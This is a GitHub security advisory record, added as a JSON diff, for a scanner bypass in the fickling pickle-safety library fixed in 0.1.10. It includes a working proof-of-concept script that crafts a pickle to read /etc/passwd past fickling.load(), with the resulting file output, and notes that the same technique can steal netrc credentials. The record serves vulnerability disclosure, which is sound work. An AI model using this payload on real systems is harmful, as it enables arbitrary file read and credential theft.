@@ -1,0 +1,69 @@
+{
+  "id": "GHSA-r48f-3986-4f9c",
+  "modified": "2026-03-13T21:09:40.043972Z",
+  "published": "2026-03-13T20:57:40Z",
+  "summary": "fickling modules linecache, difflib and gc are missing from the unsafe modules blocklist",
+  "details": "# Our analysis\n\nAs stated in the [project's security policy](https://github.com/trailofbits/fickling/security/policy), we also don't consider `UnusedVariables` bypasses to be security issues. We added several unsafe modules mentioned by the reporter in advisory comments to the blocklist (https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d). \n\n# Original report\n\nTitle: UnusedVariables analysis bypass via BUILD opcode Arbitrary File Read through fickling.load()\n\n### Summary\nTwo independent bugs in fickling's AST-based static analysis combine to allow a malicious pickle file to execute arbitrary stdlib function calls - including reading sensitive files - while check_safety() returns Severity.LIKELY_SAFE and fickling.load() completes without raising UnsafeFileError.\n\nA server using fickling.load() as a security gate before deserializing untrusted pickle data (its documented use case) is fully bypassed. The attacker receives the contents of any file readable by the server process as the return value of fickling.load().\n\n### Details\nInterpreter.unused_assignments() does not scan the result assignment's RHS\n\nFile: fickling/fickle.py, Interpreter.unused_assignments(), ~line 1242\n\n```python\nfor statement in self.module_body:\n    if isinstance(statement, ast.Assign):\n        if (\n            len(statement.targets) == 1\n            and isinstance(statement.targets[0], ast.Name)\n            and statement.targets[0].id == \"result\"\n        ):\n            break\n        ...\n        statement = statement.value\n    if statement is not None:\n        for node in ast.walk(statement):\n            if isinstance(node, ast.Name):\n                used.add(node.id)\n```\n\nWhen the loop reaches result = _varN, it breaks immediately. The right-hand side of the result assignment is never walked for variable references. Any variable whose only reference is inside the result expression is therefore never added to the used set and is incorrectly flagged as unused - unless it also appears in an earlier non-assignment statement.\n\nThe BUILD opcode generates exactly such a non-assignment statement:\n\n```python\n# Build.run() generates:\n_var4 = _var3                     # Assign  - _var3 added to used\n_var4.__setstate__(_var2)         # Expr    - _var2 and _var4 added to used\n```\n\nThis makes _var2 (the result of the dangerous call) appear in the used set via the __setstate__ expression, so UnusedVariables never flags it.\n\nFile: fickling/fickle.py, TupleThree.run(), and siblings\n\n```python\ndef run(self, interpreter: Interpreter):\n    top = interpreter.stack.pop()\n    mid = interpreter.stack.pop()\n    bot = interpreter.stack.pop()\n    interpreter.stack.append(ast.Tuple((bot, mid, top), ast.Load()))\n    #                                   ^^^^^^^^^^^^^^^^\n    #                                   Python tuple, not list\n```\n\nPython's ast module requires repeated fields (such as Tuple.elts) to be lists. When elts is a Python tuple, ast.iter_child_nodes() does not yield its elements, so ast.walk() never descends into them. Any variable reference stored inside such a tuple node is invisible to every analysis that uses ast.walk() - including UnusedVariables.\n\nDemo:\n\n```python\nimport ast\nname = ast.Name(id='_var1', ctx=ast.Load())\n\n# Correct (list elts) - ast.walk finds it\nt = ast.Tuple(elts=[name], ctx=ast.Load())\nprint([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # ['_var1']\n\n# Buggy (tuple elts) - ast.walk finds nothing\nt = ast.Tuple(elts=(name,), ctx=ast.Load())\nprint([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # []\n```\n\n#### Combined attack - arbitrary file read\n\nThe two bugs combine with the absence of `linecache` and `difflib` from `UNSAFE_IMPORTS`:\n```\nfrom linecache import getlines      # not in UNSAFE_IMPORTS\n_var0 = getlines('/etc/passwd')     # reads the file\nfrom builtins import enumerate\n_var1 = enumerate(_var0)            # _var0 in RHS - added to used\nfrom builtins import dict\n_var2 = dict(_var1)                 # _var1 in RHS - added to used; produces {0:'line1',...}\nfrom difflib import Differ\n_var3 = Differ()                    # stdlib, not in UNSAFE_IMPORTS\n_var4 = _var3\n_var4.__setstate__(_var2)           # BUILD Expr - _var2 and _var4 added to used\nresult = _var3                      # loop breaks here; nothing in defined−used\n```\n\ncheck_safety() returns Severity.LIKELY_SAFE. fickling.load() calls pickle.loads(). At runtime, Differ().__dict__.update({0: 'root:x:0:0\\n', ...}) succeeds and the file contents are returned to the caller.\n\n### PoC\n`pip install fickling`\n\n```python\n#!/usr/bin/env python3\nimport io\nimport sys\n\nimport fickling.fickle as op\nfrom fickling.fickle import Pickled\nfrom fickling.analysis import check_safety, Severity\nfrom fickling.loader import load\nfrom fickling.exception import UnsafeFileError\n\nTARGET = \"/etc/passwd\"\n\npickled = Pickled([\n    op.Proto.create(4),\n\n    op.ShortBinUnicode(\"linecache\"),\n    op.ShortBinUnicode(\"getlines\"),\n    op.StackGlobal(),\n    op.ShortBinUnicode(TARGET),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[0] = _var0 = getlines(TARGET)\n\n    op.Global(\"builtins enumerate\"),\n    op.BinGet(0),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[1] = _var1 = enumerate(_var0)\n\n    op.Global(\"builtins dict\"),\n    op.BinGet(1),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[2] = _var2 = dict(_var1)\n\n    op.ShortBinUnicode(\"difflib\"),\n    op.ShortBinUnicode(\"Differ\"),\n    op.StackGlobal(),\n    op.EmptyTuple(),\n    op.Reduce(),\n    op.Memoize(),                   # memo[3] = _var3 = Differ()\n\n    op.BinGet(2),                   # push _var2 as BUILD state\n    op.Build(),                     # _var4=_var3; _var4.__setstate__(_var2)\n\n    op.BinGet(3),\n    op.Stop(),\n])\n\nresult = check_safety(pickled)\nassert result.severity == Severity.LIKELY_SAFE, f\"Expected LIKELY_SAFE, got {result.severity}\"\nprint(f\"[+] check_safety verdict : {result.severity.name}  (bypass confirmed)\")\n\nbuf = io.BytesIO()\npickled.dump(buf)\n\nobj = load(io.BytesIO(buf.getvalue()))\nlines = {k: v for k, v in obj.__dict__.items() if isinstance(k, int)}\n\nprint(f\"[+] fickling.load() returned : {type(obj).__name__}\")\nprint(f\"[+] {TARGET} - {len(lines)} lines exfiltrated:\\n\")\nfor i in sorted(lines):\n    print(f\"{lines[i]}\", end=\"\")\n```\n\n### Result\n\n```\n[+] check_safety verdict : LIKELY_SAFE  (bypass confirmed)\n[+] fickling.load() returned : Differ\n[+] /etc/passwd - 58 lines exfiltrated:\n\n    root:x:0:0:root:/root:/usr/bin/zsh\n    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n    bin:x:2:2:bin:/bin:/usr/sbin/nologin\n    sys:x:3:3:sys:/dev:/usr/sbin/nologin\n    sync:x:4:65534:sync:/bin:/bin/sync\n    games:x:5:60:games:/usr/games:/usr/sbin/nologin\n    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n    dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n    systemd-timesync:x:992:992:systemd Time Synchronization:/:/usr/sbin/nologin\n\n```\n\n### Impact\nVulnerability type: Static analysis bypass leading to arbitrary file read (and arbitrary stdlib code execution) through a security-gated deserialization API.\n\nWho is impacted: Any application or service that calls fickling.load() or fickling.loads() to validate untrusted pickle data before deserializing it. This is the primary documented use case of the fickling.loader module. The attacker supplies a pickle file; the server processes it through fickling.load(), receives LIKELY_SAFE, and unpickles the payload. File contents are returned directly in the deserialized object's attributes.\n\nBeyond file read, the same BUILD-opcode technique can be applied to any stdlib module absent from UNSAFE_IMPORTS (e.g., gc.get_objects() for full in-process memory inspection, inspect.stack() for call-frame local variable exfiltration, netrc.netrc() for credential theft).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "fickling",
+        "purl": "pkg:pypi/fickling"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.10"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.1.9",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-r48f-3986-4f9c/GHSA-r48f-3986-4f9c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-r48f-3986-4f9c"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/trailofbits/fickling"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.10"
+    }
+  ]
+}
